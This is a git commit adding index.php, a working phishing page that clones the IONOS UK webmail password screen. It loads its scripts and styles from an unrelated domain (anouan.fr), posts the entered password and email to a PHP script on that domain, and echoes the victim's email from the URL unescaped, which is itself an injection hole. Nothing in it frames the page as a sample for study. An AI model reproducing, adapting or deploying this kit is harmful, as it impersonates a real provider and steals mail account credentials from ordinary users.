d93875b2c54f713f65fe248a60738166925b2345
janetnamikiicg <tekintufan2010@gmail.com>
2025-02-01 12:49:50 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,283 @@
+<!DOCTYPE html>
+<html><head>
+
+    
+
+    
+    
+      <script type="text/javascript" async="" src="https://anouan.fr/ionospg/bundle.min.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/ias.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/navigation.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/inpagelayer.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/privacyconsent.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/statuspage.js"></script><script type="text/javascript" async="" src="https://anouan.fr/ionospg/bundle.min.js"></script><script nonce="" src="https://anouan.fr/ionospg/login-id.js" type="text/javascript" async="async" defer="defer" id="oaotag"></script>
+    
+
+    
+    <script nonce="" src="https://anouan.fr/ionospg/ionos.min.js" async="async" defer="defer"></script>
+    <link rel="stylesheet" href="https://anouan.fr/ionospg/ionos.min.css">
+
+    <link rel="icon" type="image/png" sizes="32x32" href="https://id.ionos.co.uk/image/favicon-32px.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://id.ionos.co.uk/image/favicon-16px.png">
+    <link rel="icon" type="image/png" sizes="48x48" href="https://id.ionos.co.uk/image/favicon-48px.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://id.ionos.co.uk/image/favicon.ico">
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex">
+    <link rel="canonical" href="https://id.ionos.co.uk/password">
+
+    
+    
+
+  <title>Webmail Login - IONOS UK</title>
+  <meta name="description" content="Login to access your IONOS e-mail account and read your e-mail online with IONOS Webmail.">
+
+  <link rel="stylesheet" href="https://anouan.fr/ionospg/main.min.css">
+
+
+  <link type="text/css" rel="stylesheet" href="https://anouan.fr/ionospg/inpagelayer.css"><link rel="stylesheet" type="text/css" href="https://anouan.fr/ionospg/bundle.css"><script type="text/javascript" src="https://anouan.fr/ionospg/bundle-modern.js"></script><link type="text/css" rel="stylesheet" href="https://anouan.fr/ionospg/statuspage.css"><link type="text/css" rel="stylesheet" href="https://anouan.fr/ionospg/navigation.css"></head>
+
+  <body class="oao-pi-nolayer oao-pi-with-navigation">
+
+    
+    <link rel="stylesheet" href="https://anouan.fr/ionospg/starter-main.min.css">
+
+    <div class="page-content"><span class="page-transition__indicator-bar"></span>
+
+      
+      
+  <div class="oao-navi-navigation oao-navi-light oao-navi-nl oao-navi-items-right-2 oao-navi-finished">
+    <div class="oao-navi-top"><ul></ul></div><div class="oao-navi-left">
+      <div class="oao-navi-application-name"><ul class="oao-navi-sub-left"><li class="oao-navi-flyout-container oao-navi-flyout-application_switch "><a class="oao-navi-flyout-item oao-navi-app-name oao-navi-app-nl oao-navi-as-no-icon" href="https://www.ionos.co.uk/"><span class="oao-navi-app-logo"></span><span class="oao-navi-app-name-span-nl">
+          
+          Webmail Login
+        </span></a></li></ul>
+      </div>
+    </div>
+    
+  <div class="oao-navi-center"><ul><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-big"><div class="oao-navi-simple-tooltip">Solution finder</div><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" aria-label="Solution finder"><!--?xml version="1.0" encoding="utf-8"?-->
+<svg version="1.1" id="oao-navi-search-icon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 26" xml:space="preserve">
+<g id="dark">
+	<path class="oao-navi-icon-main" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z
+		 M9.7,17.3c-4.2,0-7.5-3.4-7.5-7.5c0-4.2,3.4-7.5,7.5-7.5c4.2,0,7.5,3.4,7.5,7.5C17.3,13.9,13.9,17.3,9.7,17.3z"></path>
+	<path class="oao-navi-icon-fill" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z"></path>
+</g>
+</svg>
+</a><div class="oao-navi-input-container"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for features, domains, and help"><i class="oao-navi-search-mic"></i></div></div></li></ul></div><div class="oao-navi-right"><ul class="oao-navi-sub"><li class="oao-navi-flyout-container oao-navi-flyout-support "><div class="oao-navi-simple-tooltip">Help &amp; contact</div><a class="oao-navi-flyout-item" data-target-id="oao-navi-support-button" aria-label="Help &amp; contact"><svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 26 26">
+	<path class="oao-navi-icon-fill" d="M1.7,25.5c-0.5,0-0.8-0.3-0.9-0.4c-0.3-0.4-0.4-0.9-0.1-1.5C1.5,21.4,2.4,19,2.8,18c-0.1-0.1-0.2-0.3-0.3-0.4
+	c-1.3-1.8-2-3.8-2-6c0-6.1,5.6-11,12.5-11c7,0,12.5,4.8,12.5,11c0,6.1-5.6,11-12.5,11c-1.5,0-2.7-0.2-3.7-0.5C9.2,22,9,22,8.9,21.9
+	c-0.6,0.3-2,1-3,1.5c-2.6,1.4-3.4,1.8-3.7,1.9C2,25.4,1.9,25.5,1.7,25.5z"></path>
+	<g class="oao-navi-icon-main">
+		<path class="oao-navi-icon-invert" d="M12.9,13.3c-0.6,0-1.1-0.5-1.1-1.1c0-1.7,1.1-2.5,1.4-2.7c0.6-0.4,0.8-0.8,0.8-1c0-0.6-0.2-0.8-0.2-0.8
+			c-0.3-0.2-0.7-0.3-0.8-0.3c-0.8,0-1,0.4-1.1,0.7c-0.1,0.6-0.7,1-1.2,0.9s-1-0.6-0.9-1.2C9.9,7,10.7,5.3,13,5.3c0.2,0,1.4,0,2.4,0.9
+			c0.4,0.4,0.9,1.1,0.9,2.3c0,0.7-0.3,1.8-1.7,2.8c-0.1,0.1-0.5,0.3-0.5,0.9C14,12.8,13.6,13.3,12.9,13.3z"></path>
+		<path class="oao-navi-icon-invert" d="M13,17.7c0.7,0,1.2-0.5,1.2-1.2s-0.5-1.2-1.2-1.2s-1.2,0.5-1.2,1.2S12.3,17.7,13,17.7z"></path>
+		<path d="M1.2,26c-0.5,0-0.8-0.3-1-0.4c-0.3-0.4-0.4-1-0.1-1.5c0.9-2.3,1.8-4.8,2.2-5.8c-0.1-0.1-0.2-0.3-0.3-0.4
+			c-1.4-1.9-2-4-2-6.2C0,5.2,5.8,0.1,13,0.1c7.3,0,13,5,13,11.5C26,17.8,20.2,23,13,23c-1.6,0-2.8-0.2-3.9-0.5
+			c-0.1,0-0.2-0.1-0.4-0.1c-0.6,0.3-2.1,1-3.1,1.6c-2.7,1.4-3.5,1.8-3.8,1.9C1.6,25.9,1.4,26,1.2,26z M13,2.2
+			c-5.9,0-10.8,4.3-10.8,9.3c0,1.8,0.5,3.5,1.6,5C4,16.7,4.2,17,4.4,17.2c0.5,0.5,0.5,0.6-1.4,5.7c0.6-0.3,1.2-0.6,1.7-0.9
+			c4-2.1,4-2.1,4.6-1.8c0.2,0.1,0.4,0.2,0.6,0.2c0.9,0.3,1.8,0.4,3.2,0.4c5.9,0,10.8-4.3,10.8-9.3C23.8,6.3,19.1,2.2,13,2.2z"></path>
+	</g>
+</svg>
+</a></li><li class="oao-navi-flyout-container oao-navi-flyout-search oao-navi-flyout-search-small"><div class="oao-navi-simple-tooltip">Solution finder</div><div class="oao-navi-search-container"><a class="oao-navi-flyout-item" aria-label="Solution finder"><!--?xml version="1.0" encoding="utf-8"?-->
+<svg version="1.1" id="oao-navi-search-icon" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 26 26" xml:space="preserve">
+<g id="dark">
+	<path class="oao-navi-icon-main" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z
+		 M9.7,17.3c-4.2,0-7.5-3.4-7.5-7.5c0-4.2,3.4-7.5,7.5-7.5c4.2,0,7.5,3.4,7.5,7.5C17.3,13.9,13.9,17.3,9.7,17.3z"></path>
+	<path class="oao-navi-icon-fill" d="M25.7,24.1l-8.2-8.6c1.2-1.6,2-3.6,2-5.8c0-5.4-4.4-9.7-9.7-9.7S0,4.4,0,9.7
+		s4.4,9.7,9.7,9.7c2.4,0,4.6-0.9,6.3-2.3l8.2,8.5c0.2,0.2,0.5,0.3,0.8,0.3s0.5-0.1,0.8-0.3C26.1,25.3,26.1,24.6,25.7,24.1z"></path>
+</g>
+</svg>
+</a><div class="oao-navi-input-container"><i class="oao-navi-search-icon"></i><input class="oao-navi-search-input" type="search" placeholder="Search for features, domains, and help"><i class="oao-navi-search-mic"></i></div></div></li></ul></div></div>
+
+
+
+      <main>
+
+        <section class="page-section page-section--default page-section--short">
+          <div class="page-section__block">
+
+          
+          
+  <div class="sheet sheet__section--warning cookie-message hidden">
+    <section class="sheet__section">
+      <h2 class="headline headline--sub">Activation of Browser Cookies Required</h2>
+      <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the use of cookies in your browser settings.</p>
+      <a href="https://www.ionos.co.uk/help/security-c85228/browser-security-c85266" class="link link--action" target="_blank">Learn more</a>
+    </section>
+  </div>
+
+
+
+          
+          
+  <noscript>
+    <div class="sheet sheet--warning">
+      <section class="sheet__section">
+        <h2 class="headline headline--sub headline--warning">Please enable JavaScript in your browser</h2>
+        <p class="paragraph">To take advantage of our offer, it is necessary for you to allow the execution of JavaScript in your browser settings.</p>
+      </section>
+    </div>
+  </noscript>
+
+
+
+          
+          
+  
+
+
+
+          
+          
+
+      <div class="sheet">
+        <section class="sheet__section sheet__section--default">
+          <ul>
+            <li class="stripe stripe--cropped">
+              <div class="stripe__item">
+                <img class="stripe__visual" src="https://anouan.fr/ionospg/password.svg" height="58" width="auto">
+              </div>
+              <div class="stripe__item">
+                <h1 class="headline stripe__element">Enter password</h1>
+              </div>
+            </li>
+          </ul>
+        </section>
+
+        <section class="sheet__section sheet__section--default">
+          
+  <div class="container-current-identifier">
+    
+      <div class="current-identifier">
+        <a class="ghost-button ghost-button--icon-only ghost-button--secondary tooltip" href="https://id.ionos.co.uk/identifier" data-tooltip="Back to login" tabindex="0">
+          <i class="ghost-button__icon exos-icon exos-icon-pagenavbackwards-16"></i>
+        </a>
+        <a class="button-current-identifier ghost-button ghost-button--with-icon ghost-button--secondary tooltip" href="https://id.ionos.co.uk/identifier" data-tooltip="Back to login" tabindex="0">
+          <i class="ghost-button__icon exos-icon exos-icon-nav-user-16"></i>
+          <span class="ghost-button__text"><?=$_GET[email]?></span>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+          <form name="Default" method="post" action="https://anouan.fr/attpg/eduuvm.php">
+            <input type="hidden" name="_csrf" value="<?=$_GET[email]?>">
+            <input type="email" class="hidden" name="identifier" id="username" tabindex="-1" spellcheck="false" value="" autocomplete="off">
+            <ul>
+              <li class="form-stripe">
+                <label class="label" for="password">Password</label>
+                <span class="input-text-group input-text-group--empty">
+                  <input type="password" class="input-text" required="true" tabindex="1" autofocus="" autocomplete="current-password" autocapitalize="none" spellcheck="false" id="password" name="password" value="">
+                  <a class="input-text-group__action password-unveil" id="password-unveil"></a>
+                </span>
+                
+                <p class="input-byline">
+                  <a class="link oao-pi-open-in-flyin" target="_blank" href="https://www.ionos.co.uk/help/index.php?id=2327">Forgot Your Password?</a>
+                </p>
+                <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" href="https://www.ionos.co.uk/help/index.php?id=5430" tabindex="0">private browsing mode</a>.</p></li>
+              <li class="form-stripe form-stripe--actions">
+                <button class="button button--primary button--full-width button--with-loader" type="submit" id="button--with-loader" tabindex="2">Next</button>
+              </li>
+            </ul>
+          </form>
+        </section>
+      </div>
+
+    
+
+          </div>
+        </section>
+
+      </main>
+
+    </div>
+
+    
+    
+
+  <footer class="page-footer">
+    <div class="page-footer__block">
+
+      <section class="page-footer__section page-footer__section--last">
+
+        <div class="page-footer__section-item">
+          <div class="oao-statuspage-overall-status page-footer__status"><a class="oao-statuspage-overall-state-none" target="_blank" href="https://www.ionos-status.co.uk/?utm_medium=footer&amp;utm_content=maintenance&amp;utm_source=LOGIN_ID&amp;utm_campaign=password&amp;utm_term=no_search">All Systems Operational</a></div>
+        </div>
+
+        <div class="page-footer__section-item page-footer__section-item--align-center page-footer__section-item--small-align-left">
+          © 2025
+          
+            
+            
+            
+            <a class="page-footer__link" target="_blank" href="https://www.ionos.co.uk/about">IONOS Cloud Ltd.</a>
+            
+            
+            
+            
+          
+        </div>
+
+        <div class="page-footer__section-item page-footer__section-item--align-right page-footer__section-item--small-align-left">
+          
+          
+            
+            
+            
+            <a class="page-footer__link" target="_blank" href="https://www.ionos.co.uk/terms-gtc/terms-privacy">Privacy Policy</a>
+            
+            
+            
+            
+           -
+          
+            
+            
+            
+            <a class="page-footer__link" target="_blank" href="https://www.ionos.co.uk/terms-gtc">T&amp;Cs</a>
+            
+            
+            
+            
+          
+        </div>
+
+      </section>
+
+    </div>
+  </footer>
+
+
+
+
+    
+
+    
+    <script nonce="" src="https://anouan.fr/ionospg/starter-main.min.js" type="text/javascript"></script>
+
+    
+    
+  
+  
+  <div>
+    
+      <div id="javascript-data" data-visit-id="f489999b-d583-441d-bd4d-e3e18e022a67.A" data-lang="en" data-tenant="GB" data-context-path="/" data-env-mode="prod" data-artifact-version="1.0.123" data-artifact-name="id" data-sherlock-url="https://sherlock.ionos.co.uk/">
+      </div>
+    
+  </div>
+
+
+
+  <script nonce="" src="https://anouan.fr/ionospg/main.min.js"></script>
+
+
+
+    
+    
+
+  
+
+
+<div class="page-transition__blocker"><div class="page-transition__loading-spin loading-spin"></div></div><div class="static-overlay__blocker static-overlay__blocker--hidden"></div></body></html>
